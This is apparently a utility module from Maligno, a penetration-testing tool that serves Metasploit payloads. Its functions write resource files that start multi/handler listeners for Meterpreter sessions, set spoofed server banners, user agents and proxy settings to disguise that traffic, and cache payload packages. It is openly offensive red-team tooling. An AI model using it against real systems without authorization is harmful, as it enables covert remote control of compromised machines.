#!/usr/bin/python

################################################################
#                                                              #
# Maligno - A Metasploit payload server                        #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013-2015 Encripto AS. All rights reserved.        #
#                                                              #
# Maligno is licensed under the FreeBSD license.               #
# http://www.freebsd.org/copyright/freebsd-license.html        #
#                                                              #
################################################################

import os
import malcfg


BLOCK_SIZE_VALUE = "Block size must be 16, 24 or 32"
BOOLEAN_VALUE = "Value must be boolean (true or false)"
EMPTY_VALUE = "Parameter does not exist or contains empty value"
EMPTY_SECTION = "Empty \'%s\' section in \'%s\'\n"
ENCODING_VALUE = "Encoding must be base64, bin or hex"
FILE_NOT_FOUND = "File cannot be found"
INVALID_CHARS = "There was a problem while parsing the XML file. Maybe you have illegal chars?"
INVALID_HOST = "Invalid IP address or Fully Qualified Domain Name"
INVALID_IP = "Invalid IP address"
INVALID_FQDN = "Invalid Fully-Qualified Domain Name"
INVALID_LOCATION = "Parameter location is not QUERYSTRING, COOKIE or BODY"
INVALID_LOCATION_METHOD = "Parameter location cannot be used with current request method"
INVALID_METHOD = "Request method is not GET, POST or HEAD"
INVALID_PORT = "Port number not in range [1-65535]"
INVALID_PROTOCOL = "Protocol is not HTTP/1.0 or HTTP/1.1"
KEY_SIZE_VALUE = "Key size must be equals to block size (expected length 16, 24 or 32)"
NON_NEGATIVE_VALUE = "Value must be equals to or greater than zero"
NO_SECTION_FOUND = "No \'%s\' sections have been found in \'%s\'\n"
PATH_MSFVENOM = "Path to msfvenom cannot be found"
POSITIVE_VALUE = "Value must be greater than 0"


def print_ok(msg):
    print "\033[1;32m[+]\033[1;m {0}".format(msg)


def print_warning(msg):
    print "\033[1;33m[!]\033[1;m {0}".format(msg)

def print_error(msg):
    print "\033[1;31m[-]\033[1;m {0}".format(msg)


def print_info(msg):
    print "\033[1;34m[*]\033[1;m {0}".format(msg)


def print_title(msg):
    print "\033[1;37m{0}\033[1;m".format(msg)


def print_config_error(filename, section, key, msg):
    print_error("There is an error in your configuration.\n")
    print_error("File: %s" % filename)
    print_error("Section: %s" % section)
    print_error("Parameter: %s" % key)
    print_error("Error: %s" % msg)
    print ""


def print_header(version, author):
    os.system("clear")

    print ""
    print " ================================================================= "
    print "|  Maligno v{0}: A Metasploit payload server\t\t\t  |".format(version)
    print "|  by {0}\t\t  |".format(author)
    print " ================================================================= "
    print ""


def generate_resource_file(server_config, metasploit_config, profile_response_config, profile_client_header_config, msfpayload):

    resource_folder = metasploit_config["resourcefolder"]
    payload = msfpayload["payload"]
    payload_id = msfpayload["id"]
    host = msfpayload["lhost"]
    port = msfpayload["lport"]
    srv_banner = profile_response_config["banner"]
    user_agent = ""
    if profile_client_header_config:
        for header in profile_client_header_config:
            if header and header["field"].upper() == "USER-AGENT":
                user_agent = header["value"]

    error_template = profile_response_config["errortemplate"]
    proxy_srv = server_config["addr"]
    proxy_port = server_config["proxyport"]

    malcfg.check_file_exists(error_template)

    ft = open(error_template, 'r')
    error_msg = ft.read().replace("\n", "").rstrip().lstrip()
    ft.close()

    try:
        p = payload.replace(" ", "").split('/')
        profile_name = server_config["profile"].split("/")[-1].split(".")[0]
        resource_file = "%s_%s_%s_%s_%s.rc" % (payload_id, profile_name, str(p[-1]), host, port)

        if not os.path.exists(resource_folder):
            os.makedirs(resource_folder)

        resource_path = "%s/%s" % (resource_folder, resource_file)
        fw = open(resource_path, 'w')

        fw.write("use exploit/multi/handler\n")
        fw.write("set PAYLOAD " + payload + "\n")
        fw.write("set LHOST " + host + "\n")
        fw.write("set LPORT " + port + "\n")
        fw.write("set EXITFUNC thread\n")
        fw.write("set EnableStageEncoding true\n")
        fw.write("set SessionCommunicationTimeout 0\n")

        if payload.find("http") > -1:
            fw.write("set MeterpreterServerName \"" + srv_banner + "\"\n")
            fw.write("set MeterpreterUserAgent \"" + user_agent + "\"\n")
            fw.write("set HttpUnknownRequestResponse \"" + error_msg + "\"\n")

        if payload.find("https_proxy") > -1:
            fw.write("set PayloadProxyHost " + proxy_srv + "\n")
            fw.write("set PayloadProxyPort " + proxy_port + "\n")
            fw.write("set PayloadProxyType SOCKS\n")

        fw.write("set ExitOnSession false\n")
        fw.write("sleep 2\n")
        fw.write("exploit -j -z\n")
        fw.close()

    except IOError:
        print_error("Could not generate metasploit resource file.")

    except OSError:
        print_error("Could not create metasploit resource folder.")

    return


def generate_failsafe_resource_file(server_config, metasploit_config, profile_response_config, profile_client_header_config, msfpayload, proxy_srv, proxy_port):

    resource_folder = metasploit_config["resourcefolder"]
    payload = msfpayload["payload"]
    payload_id = msfpayload["id"]
    host = msfpayload["lhost"]
    port = msfpayload["lport"]
    srv_banner = profile_response_config["banner"]
    user_agent = ""
    if profile_client_header_config:
        for header in profile_client_header_config:
            if header and header["field"].upper() == "USER-AGENT":
                user_agent = header["value"]

    error_template = profile_response_config["errortemplate"]
    malcfg.check_file_exists(error_template)

    ft = open(error_template, 'r')
    error_msg = ft.read().replace("\n", "").rstrip().lstrip()
    ft.close()

    try:
        resource_file = "failsafe.rc"

        if not os.path.exists(resource_folder):
            os.makedirs(resource_folder)

        resource_path = "%s/%s" % (resource_folder, resource_file)
        fw = open(resource_path, 'w')

        fw.write("use exploit/multi/handler\n")
        fw.write("set PAYLOAD " + payload + "\n")
        fw.write("set LHOST " + host + "\n")
        fw.write("set LPORT " + port + "\n")
        fw.write("set EXITFUNC thread\n")
        fw.write("set EnableStageEncoding true\n")
        fw.write("set SessionCommunicationTimeout 0\n")

        if payload.find("http") > -1:
            fw.write("set MeterpreterServerName \"" + srv_banner + "\"\n")
            fw.write("set MeterpreterUserAgent \"" + user_agent + "\"\n")
            fw.write("set HttpUnknownRequestResponse \"" + error_msg + "\"\n")

        if payload.find("https_proxy") > -1:
            fw.write("set PayloadProxyHost " + proxy_srv + "\n")
            fw.write("set PayloadProxyPort " + proxy_port + "\n")
            fw.write("set PayloadProxyType HTTP\n")

        fw.write("set ExitOnSession false\n")
        fw.write("sleep 2\n")
        fw.write("exploit -j -z\n")
        fw.close()

    except IOError:
        print_error("Could not generate metasploit resource file.")

    except OSError:
        print_error("Could not create metasploit resource folder.")

    return


def store_package_in_cache(cache_folder, cache_file, default_file, package):
    try:
        if not os.path.exists(cache_folder):
            os.makedirs(cache_folder)

        cache_path = "%s/%s" % (cache_folder, cache_file)
        default_path = "%s/%s" % (cache_folder, default_file)
        fw = open(cache_path, 'w')
        fw.write(package)
        fw.close()

        if not os.path.isfile(default_path):
            fw = open(default_path, 'w')
            fw.write(package)
            fw.close()

    except IOError:
        print_error("Could not store package in cache.")

    except OSError:
        print_error("Could not create metasploit cache folder.")

    return


def read_package_from_cache(cache_path):
    lines = ""
    package = ""

    try:
        fr = open(cache_path, 'r')
        lines = fr.readlines()
        for l in lines:
            package += l

        fr.close()

    except IOError:
        print_error("Could not find %s." % cache_path)

    return package
